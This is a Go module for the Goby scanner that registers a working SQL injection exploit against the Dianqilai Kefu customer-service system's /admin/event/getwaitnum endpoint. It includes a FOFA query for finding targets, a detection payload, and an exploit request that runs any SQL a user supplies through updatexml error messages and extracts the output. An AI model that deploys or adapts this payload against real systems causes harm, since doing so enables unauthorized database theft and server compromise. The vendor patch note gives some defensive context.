package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "Dianqilai Kefu system getwaitnum interface SQL injection vulnerability",
    "Description": "<p>Dianqilai kefu system deployed with privatized source code, which supports access to small programs, official accounts, websites, and APPs.</p><p>The business_id parameter of the Dianqilai kefu system interface /admin/event/getwaitnum has a SQL injection vulnerability due to improper filtering.</p>",
    "Product": "Dianqilai-Kefu",
    "Homepage": "https://www.zjhejiang.com/",
    "DisclosureDate": "2022-11-11",
    "Author": "sharecast",
    "FofaQuery": "body=\"layui-form-item\" && body=\"/admin/login/check.html\"",
    "GobyQuery": "body=\"layui-form-item\" && body=\"/admin/login/check.html\"",
    "Level": "2",
    "Impact": "<p>In addition to using SQL injection vulnerabilities to obtain information in the database (for example, the administrator's back-end password, the user's personal information of the site), an attacker can write a Trojan horse to the server even in a high-privileged situation to further obtain server system permissions.</p>",
    "Recommendation": "<p>At present, the manufacturer has released a patch, please update it in time:</p><p><a href=\"https://www.zjhejiang.com/site/app-detail?id=44\">https://www.zjhejiang.com/site/app-detail?id=44</a></p><p><a href=\"https://www.opencartextensions.in/opencart-multi-vendor-multi-seller-marketplace\"></a></p>",
    "References": [
        "https://mp.weixin.qq.com/s/DXG228VhQVSCVVn2aeePOQ"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "sql",
            "type": "input",
            "value": "select+database()",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/admin/event/getwaitnum",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded",
                    "X-Requested-With": "XMLHttpRequest"
                },
                "data_type": "text",
                "data": "business_id[]=exp&business_id[]=+and+updatexml(1,concat(0x7e,md5(0x5c)),1)&groupid=1"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "500",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "28d397e87306",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/admin/event/getwaitnum",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded",
                    "X-Requested-With": "XMLHttpRequest"
                },
                "data_type": "text",
                "data": "business_id[]=exp&business_id[]=+and+updatexml(1,concat(0x7e,({{{sql}}}),0x7e),1)&groupid=1"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "500",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|~(.*?)~"
            ]
        }
    ],
    "Tags": [
        "SQL Injection"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.5",
    "Translation": {
        "CN": {
            "Name": "点企来客服系统 getwaitnum 接口SQL注入漏洞",
            "Product": "点企来客服系统",
            "Description": "<p>点企来是私有化源码部署的客服系统，支持接入到小程序、公众号、网站、APP。</p><p>点企来客服系统接口/admin/event/getwaitnum的business_id参数由于过滤不当导致存在SQL注入漏洞。</p>",
            "Recommendation": "<p>目前厂商已经发布补丁，请及时进行更新：</p><p><a href=\"https://www.zjhejiang.com/site/app-detail?id=44\">https://www.zjhejiang.com/site/app-detail?id=44</a><br></p>",
            "Impact": "<p>攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。<br></p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "Dianqilai Kefu system getwaitnum interface SQL injection vulnerability",
            "Product": "Dianqilai-Kefu",
            "Description": "<p>Dianqilai kefu system deployed with privatized source code, which supports access to small programs, official accounts, websites, and APPs.</p><p>The business_id parameter of the Dianqilai kefu system interface /admin/event/getwaitnum has a SQL injection vulnerability due to improper filtering.</p>",
            "Recommendation": "<p>At present, the manufacturer has released a patch, please update it in time:</p><p><a href=\"https://www.zjhejiang.com/site/app-detail?id=44\">https://www.zjhejiang.com/site/app-detail?id=44</a><br></p><p><a href=\"https://www.opencartextensions.in/opencart-multi-vendor-multi-seller-marketplace\"></a></p>",
            "Impact": "<p>In addition to using SQL injection vulnerabilities to obtain information in the database (for example, the administrator's back-end password, the user's personal information of the site), an attacker can write a Trojan horse to the server even in a high-privileged situation to further obtain server system permissions.<br></p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10755"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}